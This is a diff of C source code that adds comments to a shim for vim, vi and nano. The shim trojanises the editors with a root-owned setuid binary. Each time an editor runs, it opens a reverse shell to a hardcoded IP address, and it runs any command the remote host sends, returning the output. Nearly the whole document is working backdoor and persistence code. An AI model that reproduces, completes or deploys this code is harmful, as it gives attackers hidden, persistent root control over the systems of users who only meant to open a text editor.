@@ -1,3 +1,6 @@
+//Michael Burke
+//Shim for vim, vi and nano that establishes a reverse shell every time they are run.
+
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -9,16 +12,21 @@
 #include <assert.h>
 #include <sys/stat.h>
 #include <signal.h>
+
+//These define statements will get changed depending on the editor being shimmed
 #define PORT 6969
 #define STATUS "{STATUS}"
 #define PAYLOAD "{PAYLOAD}"
 #define ERROR "{ERROR}"
 #define BINARYNAME "{BINARYNAME}"
 #define EDITOR "{EDITOR}"
+
+//Simple define statements to make things easier
 #define TRUE 1
 #define FALSE 0
 #define ERR -1
 
+//Write the current pid to the file defined by STATUS
 int writepid(){
     FILE *file;
     pid_t pid = getpid();
@@ -30,6 +38,7 @@ int writepid(){
     return TRUE;
 }
 
+//Read the current file defined by STATUS and return the PID as an int
 int getrunningpid(){
     int pid;
     FILE *file;
@@ -41,6 +50,8 @@ int getrunningpid(){
     return pid;
 }
 
+//Test to see if the file defined by STATUS exists;
+//If it does, test to see if the process is currently running
 int testpid(){
     struct stat sts;
     int pid = getrunningpid();
@@ -53,15 +64,15 @@ int testpid(){
     return FALSE;
 }
 
-
+//Main function for the reverse shell
 int establishConnection(int port, int shell) {
+    //Initialize the socket
     int sock = 0, valread;
     struct sockaddr_in serv_addr;
     char buffer[1024] = {0};
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         return ERR;
     }
-   
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
     if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) {
@@ -72,52 +83,63 @@ int establishConnection(int port, int shell) {
         return ERR;
     }
     
+    //Test whether we should request a port from the server
+    //or if we should open the reverse shell
     if (shell == 1){
+        //If we've already received a port from the server, open the shell
+
+        //Write the current PID to the file; exit if it errors out
         if (writepid() == ERR) {
             return ERR;
         }
+        //Receive commands from the connection
         while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
             char line[1024];
             //Remove trailing newline
             buffer[strcspn(buffer, "\n")] = 0;
+            //Output error to a temporary file so we can capture both outputs
             strcat(buffer, " 2>");
             strcat(buffer, ERROR);
+            //Execute the received command and return the output
             FILE* fp = popen(buffer, "r");
             while((fgets(line, 1024, fp))) {
                 write(sock , line , strlen(line));
             }
+            //Read any errors and send them back as well
             FILE* err = fopen(ERROR, "r");
             while((fgets(line, 1024, err))) {
                 write(sock , line , strlen(line));
             }
-            char tmpcmd[50] = "rm -f ";
-            strcat(tmpcmd, ERROR);
-            system(tmpcmd);
+            remove(ERROR);
         }
     } else {
+        //If we haven't received a port yet, request one from the
+        //server and run establishConnection again with the result
         valread = read( sock , buffer, 1024);
         establishConnection(atoi(buffer), 1);
     }
     return 0;
 }
 
+//Install the shim
 int install(char *fname){
+    //Test to see if the shim is already installed
     char *file = fname + 2;
     char path[50] = "/usr/bin/";
     strcat(path, BINARYNAME);
     if (access(path, F_OK) == FALSE ) {
         return FALSE;
     }
-    //install
-    //move old binary
+    //Move the old binary
     char newpath[50] = "/usr/bin/";
     strcat(newpath, BINARYNAME);
     rename(EDITOR, newpath);
-    //replace with new binary
+    //Replace with the new binary
     rename(file, EDITOR);
-    //change ownership
+    //Change ownership
     chown(EDITOR, 0, 0);
-    //setuid
+    //Setuid
+    //No easy way to do this in C as far as I can tell; do it with bash instead
     char cmd[50] = "chmod +s ";
     strcat(cmd, EDITOR);
     system(cmd);
@@ -127,10 +149,13 @@ int install(char *fname){
 
 
 int main (int argc, char *argv[]) {
+    //Set the uid to root
     setuid(0);
     if (install(argv[0]) == TRUE){
         return FALSE;
     }
+
+    //Build the system() command to execute the editor with any given parameters
     char args[100] = BINARYNAME;
     strcat(args, " ");
     for (int i = 1;i<argc;i++){
@@ -139,7 +164,11 @@ int main (int argc, char *argv[]) {
             strcat(args, " ");
         }
     }
+
+    //Test to see if the payload binary exists
     if (access(PAYLOAD, F_OK) != FALSE ) {
+        //If it doesn't, copy shim to PAYLOAD and execute it,
+        //then execute the editor command
         char cmd1[50] = "cp ";
         char cmd2[50] = PAYLOAD;
         char cmd3[50] = "rm -f ";
